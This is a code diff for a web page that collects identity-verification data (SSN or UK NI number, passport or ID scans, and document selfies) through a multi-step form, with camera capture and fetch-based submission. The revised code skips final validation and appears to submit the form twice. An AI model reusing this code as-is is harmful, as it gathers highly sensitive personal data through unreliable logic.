@@ -478,11 +478,11 @@
                 <div class="form-group">
                     <label for="country">Country</label>
                     <select id="country" name="country">
-                        </select>
+                    </select>
                     <span class="error-message" id="countryError">Please select your country.</span>
                 </div>
                 <div id="personalInfoFields">
-                    </div>
+                </div>
                 <div class="form-navigation">
                     <button type="button" class="next-btn" id="nextBtn1">Next <i class="fas fa-arrow-right"></i></button>
                 </div>
@@ -493,7 +493,7 @@
                     <label>Verification Method</label>
                     <input type="hidden" id="documentType" name="documentType">
                     <div class="document-options">
-                        </div>
+                    </div>
                     <span class="error-message" id="documentTypeError">Please select a verification method.</span>
                 </div>
                 <div class="form-navigation">
@@ -504,7 +504,7 @@
 
             <div class="form-section" id="step3">
                 <div id="dynamicFields">
-                    </div>
+                </div>
                 <div class="form-navigation">
                     <button type="button" class="back-btn" id="backBtn3">Back</button>
                     <button type="submit" id="submitBtn">Submit <i class="fas fa-paper-plane"></i></button>
@@ -567,7 +567,7 @@
 
         // Data Storage for files
         const fileData = {};
-        
+
         // List of Countries
         const countryList = [
             { code: "US", name: "United States" },
@@ -622,6 +622,7 @@
 
         // --- Animations & UI Effects ---
         gsap.to(formContainer, { opacity: 1, duration: 0.5, ease: "power2.out" });
+
         document.addEventListener('mousemove', (e) => {
             gsap.to('.glow', {
                 x: e.clientX,
@@ -631,6 +632,7 @@
                 ease: "power2.out"
             });
         });
+
         document.body.addEventListener('mouseleave', () => {
             gsap.to('.glow', { opacity: 0, duration: 0.5 });
         });
@@ -662,7 +664,6 @@
         // --- Core Functions ---
         function populateCountries() {
             let optionsHtml = `<option value="" disabled selected>Select your country</option>`;
-            
             const specialCountries = countryList.filter(c => c.code === "US" || c.code === "GB");
             specialCountries.forEach(country => {
                 optionsHtml += `<option value="${country.code}">${country.name}</option>`;
@@ -672,7 +673,6 @@
             otherCountries.forEach(country => {
                 optionsHtml += `<option value="${country.code}">${country.name}</option>`;
             });
-
             countrySelect.innerHTML = optionsHtml;
         }
 
@@ -720,7 +720,6 @@
                 `;
             }
             personalInfoFields.innerHTML = html;
-            
             if (countryCode === 'US') {
                 const ssnInput = document.getElementById('ssn');
                 ssnInput.addEventListener('input', formatSSN);
@@ -761,20 +760,17 @@
                 });
                 documentOptionsContainer.appendChild(div);
             });
-            
             gsap.fromTo(documentOptionsContainer.querySelectorAll('.document-option'), { scale: 0.8, opacity: 0 }, { scale: 1, opacity: 1, stagger: 0.1, duration: 0.4, ease: "back.out(1.7)" });
         }
         
         function updateDynamicFields(selectedType) {
             let html = '';
-            
             for (const key in fileData) {
                 delete fileData[key];
             }
             document.querySelectorAll('input[type="file"]').forEach(input => {
                 input.value = '';
             });
-
             if (selectedType === 'passport') {
                 html = `
                     <div class="form-group visible">
@@ -834,7 +830,6 @@
             gsap.fromTo(dynamicFieldsContainer.querySelectorAll('.form-group'), { y: 20, opacity: 0 }, { y: 0, opacity: 1, stagger: 0.1, duration: 0.4 });
         }
 
-
         function formatSSN(e) {
             const input = e.target;
             const value = input.value.replace(/\D/g, '');
@@ -860,12 +855,10 @@
             }
         });
 
-
         // --- Validation Functions ---
         function checkStep1Validity() {
             const countryCode = countrySelect.value;
             let isValid = false;
-
             if (countryCode === 'US') {
                 const fullName = document.getElementById('fullName').value.trim();
                 const ssn = document.getElementById('ssn').value.trim();
@@ -917,18 +910,23 @@
         function nextStep(stepNumber) {
             const currentStepElement = document.querySelector('.form-section.active');
             const nextStepElement = document.getElementById(`step${stepNumber}`);
-            
             const isMovingForward = stepNumber > currentStep;
+
             if (isMovingForward) {
                 const isValid = validateStep(currentStep);
                 if (!isValid) return;
             }
 
-            gsap.to(currentStepElement, { opacity: 0, y: isMovingForward ? -20 : 20, duration: 0.3, onComplete: () => {
-                currentStepElement.classList.remove('active', 'visible');
-                nextStepElement.classList.add('active', 'visible');
-                gsap.fromTo(nextStepElement, { y: isMovingForward ? 20 : -20, opacity: 0 }, { y: 0, opacity: 1, duration: 0.5, ease: "power2.out" });
-            }});
+            gsap.to(currentStepElement, {
+                opacity: 0,
+                y: isMovingForward ? -20 : 20,
+                duration: 0.3,
+                onComplete: () => {
+                    currentStepElement.classList.remove('active', 'visible');
+                    nextStepElement.classList.add('active', 'visible');
+                    gsap.fromTo(nextStepElement, { y: isMovingForward ? 20 : -20, opacity: 0 }, { y: 0, opacity: 1, duration: 0.5, ease: "power2.out" });
+                }
+            });
 
             currentStep = stepNumber;
             updateProgressBar(currentStep);
@@ -947,7 +945,6 @@
                     step.classList.remove('active');
                 }
             });
-
             let progress = (stepNumber - 1) * 50;
             gsap.to(progressLine, { width: `${progress}%`, duration: 0.4 });
         }
@@ -957,7 +954,7 @@
             let isValid = true;
             document.querySelectorAll('.error-message').forEach(span => span.style.display = 'none');
             const countryCode = countrySelect.value;
-            
+
             if (stepNumber === 1) {
                 if (!countryCode) {
                     showError('countryError', 'Please select your country.');
@@ -1046,127 +1043,143 @@
                 errorElement.style.display = 'none';
             }
         }
-        
-        // --- Camera & File Handling ---
-        async function openCamera(inputId, facingMode) {
-            currentInputId = inputId;
-            let constraints = { video: { facingMode: facingMode, width: { ideal: 1280 }, height: { ideal: 720 } } };
 
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                currentStream = stream;
-                cameraFeed.srcObject = stream;
-                cameraPopup.style.display = 'flex';
-                
-                gsap.fromTo(cameraPopup, { opacity: 0 }, { opacity: 1, duration: 0.3 });
-                gsap.fromTo('.camera-content', { scale: 0.8, y: 50 }, { scale: 1, y: 0, duration: 0.5, ease: "back.out(1.7)" });
-                gsap.fromTo('#camera-container', { boxShadow: '0 0 0px var(--glow-color)' }, { boxShadow: '0 0 15px var(--glow-color)', repeat: -1, yoyo: true, duration: 1.5 });
-            } catch (err) {
-                console.error("Error accessing camera:", err);
-                
-                // If facingMode was 'user' (front camera) and it failed, try 'environment' (back camera)
-                if (facingMode === 'user' && (err.name === "NotAllowedError" || err.name === "NotFoundError" || err.name === "OverconstrainedError")) {
-                    console.log("Failed to access front camera, attempting fallback to back camera.");
-                    try {
-                        const fallbackStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } } });
-                        currentStream = fallbackStream;
-                        cameraFeed.srcObject = fallbackStream;
-                        cameraPopup.style.display = 'flex';
-                        gsap.fromTo(cameraPopup, { opacity: 0 }, { opacity: 1, duration: 0.3 });
-                        gsap.fromTo('.camera-content', { scale: 0.8, y: 50 }, { scale: 1, y: 0, duration: 0.5, ease: "back.out(1.7)" });
-                        gsap.fromTo('#camera-container', { boxShadow: '0 0 0px var(--glow-color)' }, { boxShadow: '0 0 15px var(--glow-color)', repeat: -1, yoyo: true, duration: 1.5 });
-                        return;
-                    } catch (fallbackErr) {
-                        console.error("Fallback camera also failed:", fallbackErr);
-                        handleCameraError(fallbackErr);
-                    }
-                } else {
-                    handleCameraError(err);
+        // --- Camera Functions ---
+        function openCamera(inputId, facingMode) {
+            currentInputId = inputId;
+            cameraPopup.style.display = 'flex';
+            const constraints = {
+                video: {
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 },
+                    facingMode: facingMode
                 }
-            }
-        }
-        
-        function handleCameraError(err) {
-            let errorMessage = "Failed to access camera. ";
-            if (location.protocol !== 'https:') {
-                errorMessage += "Camera access requires HTTPS. Please ensure your website is running on a secure connection (https://).";
-            } else if (err.name === "NotAllowedError") {
-                errorMessage += "Permission denied. Please allow camera access in your browser settings.";
-            } else if (err.name === "NotFoundError" || err.name === "OverconstrainedError") {
-                errorMessage += "No suitable camera found on this device.";
-            } else {
-                errorMessage += "An unknown error occurred. Please try again.";
-            }
-            alert(errorMessage);
+            };
+            navigator.mediaDevices.getUserMedia(constraints)
+                .then(stream => {
+                    currentStream = stream;
+                    cameraFeed.srcObject = stream;
+                })
+                .catch(err => {
+                    console.error("Error accessing the camera: ", err);
+                    alert("Unable to access camera. Please ensure you have given permission and are using a secure connection (https).");
+                    closeCamera();
+                });
         }
 
         function closeCamera() {
-            gsap.to('.camera-content', { scale: 0.8, y: 50, duration: 0.3 });
-            gsap.to(cameraPopup, { opacity: 0, duration: 0.3, onComplete: () => {
-                cameraPopup.style.display = 'none';
-                if (currentStream) {
-                    currentStream.getTracks().forEach(track => track.stop());
-                }
-            }});
+            if (currentStream) {
+                currentStream.getTracks().forEach(track => track.stop());
+            }
+            cameraPopup.style.display = 'none';
         }
-        
+
         captureBtn.addEventListener('click', () => {
-            gsap.to('#capture-btn', { scale: 1.1, duration: 0.2, yoyo: true, repeat: 1, onComplete: () => {
-                cameraCanvas.width = cameraFeed.videoWidth;
-                cameraCanvas.height = cameraFeed.videoHeight;
-                const context = cameraCanvas.getContext('2d');
-                context.drawImage(cameraFeed, 0, 0, cameraCanvas.width, cameraCanvas.height);
-                
-                cameraCanvas.toBlob((blob) => {
-                    const docId = getDocId(currentInputId);
-                    const fileName = `${docId}.jpg`;
-                    const file = new File([blob], fileName, { type: "image/jpeg" });
-                    
-                    fileData[currentInputId] = file;
+            const context = cameraCanvas.getContext('2d');
+            const video = cameraFeed;
+            const aspectRatio = video.videoWidth / video.videoHeight;
+            const canvasWidth = 640;
+            const canvasHeight = canvasWidth / aspectRatio;
 
-                    const dataTransfer = new DataTransfer();
-                    dataTransfer.items.add(file);
-                    const fileInput = document.getElementById(currentInputId);
-                    fileInput.files = dataTransfer.files;
+            cameraCanvas.width = canvasWidth;
+            cameraCanvas.height = canvasHeight;
+            context.drawImage(video, 0, 0, canvasWidth, canvasHeight);
 
-                    const cameraButton = document.querySelector(`button[onclick*="'${currentInputId}'"]`);
-                    if (cameraButton) {
-                        cameraButton.innerHTML = `<i class="fas fa-check"></i> ${fileName}`;
-                        cameraButton.classList.add('attached');
-                    }
-                    
-                    closeCamera();
-                    hideError(`${currentInputId}Error`);
-                    checkStep3Validity();
-                }, 'image/jpeg');
-            }});
+            const imageDataUrl = cameraCanvas.toDataURL('image/jpeg', 0.8);
+            const fileName = `captured-image-${new Date().getTime()}.jpeg`;
+
+            fileData[currentInputId] = {
+                name: fileName,
+                dataUrl: imageDataUrl
+            };
+
+            const cameraButton = document.querySelector(`button[onclick*="'${currentInputId}'"]`);
+            if (cameraButton) {
+                cameraButton.classList.add('attached');
+                cameraButton.innerHTML = `<i class="fas fa-check"></i> ${fileName}`;
+            }
+
+            closeCamera();
+            if (currentInputId.includes('selfie')) {
+                // If the user just took a selfie, check step 3 validity
+                checkStep3Validity();
+            }
         });
 
-        function getDocId(inputId) {
-            switch(inputId) {
-                case 'passportUpload': return 'passport_scan';
-                case 'selfiePassportUpload': return 'selfie_with_passport';
-                case 'frontSide': return 'doc_front_side';
-                case 'backSide': return 'doc_back_side';
-                case 'selfieDlId': return 'selfie_with_doc';
-                default: return 'doc';
+        // Form Submission
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            const formData = new FormData();
+            
+            // Append form data
+            formData.append('country', countrySelect.value);
+            const selectedType = documentTypeSelect.value;
+            formData.append('documentType', selectedType);
+            
+            if (document.getElementById('fullName')) {
+                formData.append('fullName', document.getElementById('fullName').value);
             }
+            if (document.getElementById('ssn')) {
+                formData.append('ssn', document.getElementById('ssn').value);
+            }
+            if (document.getElementById('nino')) {
+                formData.append('nino', document.getElementById('nino').value);
+            }
+            if (document.getElementById('firstName')) {
+                formData.append('firstName', document.getElementById('firstName').value);
+            }
+            if (document.getElementById('lastName')) {
+                formData.append('lastName', document.getElementById('lastName').value);
+            }
+            
+            // Append image files from fileData
+            for (const key in fileData) {
+                const dataUrl = fileData[key].dataUrl;
+                const blob = dataURLtoBlob(dataUrl);
+                formData.append(key, blob, fileData[key].name);
+            }
+            
+            // Use the native fetch API to submit the form
+            fetch(form.action, {
+                method: form.method,
+                body: formData,
+                headers: {
+                    'Accept': 'application/json'
+                }
+            })
+            .then(response => {
+                if (response.ok) {
+                    showSuccessAnimation();
+                } else {
+                    response.json().then(data => {
+                        if (Object.hasOwnProperty.call(data, 'errors')) {
+                            alert(data["errors"].map(error => error["message"]).join(", "));
+                        } else {
+                            alert("Oops! There was a problem submitting your form");
+                        }
+                    });
+                }
+            })
+            .catch(error => {
+                alert("Oops! There was a problem submitting your form");
+                console.log(error);
+            });
+        });
+
+        function dataURLtoBlob(dataurl) {
+            const arr = dataurl.split(',');
+            const mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]);
+            let n = bstr.length;
+            const u8arr = new Uint8Array(n);
+            while(n--) {
+                u8arr[n] = bstr.charCodeAt(n);
+            }
+            return new Blob([u8arr], { type: mime });
         }
 
-        // --- Form Submission ---
-        form.addEventListener('submit', (e) => {
-            const isValid = validateStep(3);
-            if (!isValid) {
-                e.preventDefault();
-                const firstError = document.querySelector('.error-message[style*="block"]');
-                if (firstError) {
-                    firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
-                }
-                return;
-            }
-            
-            e.preventDefault();
-            
+        // --- Success Animation ---
+        function showSuccessAnimation() {
             const timeline = gsap.timeline({ onComplete: () => {
                 form.submit();
             }});
@@ -1180,7 +1193,7 @@
             .fromTo('.checkmark__check', { strokeDashoffset: 48 }, { strokeDashoffset: 0, duration: 0.2, ease: "power2.inOut" }, "-=0.2")
             .fromTo(successAnimation.querySelector('h3'), { opacity: 0, y: 20 }, { opacity: 1, y: 0, duration: 0.2 }, "-=0.2")
             .fromTo(successAnimation.querySelector('p'), { opacity: 0, y: 20 }, { opacity: 1, y: 0, duration: 0.2 }, "-=0.1");
-        });
+        }
 
         // --- Navigation Buttons ---
         nextBtn1.addEventListener('click', () => { nextStep(2); });
@@ -1188,10 +1201,10 @@
         backBtn2.addEventListener('click', () => { nextStep(1); });
         backBtn3.addEventListener('click', () => { nextStep(2); });
 
-        // --- Initial Setup ---
-        populateCountries();
-        updatePersonalInfoFields();
-        updateDocumentOptions();
+        // Initial setup
+        document.addEventListener('DOMContentLoaded', () => {
+            populateCountries();
+        });
     </script>
 </body>
 </html>
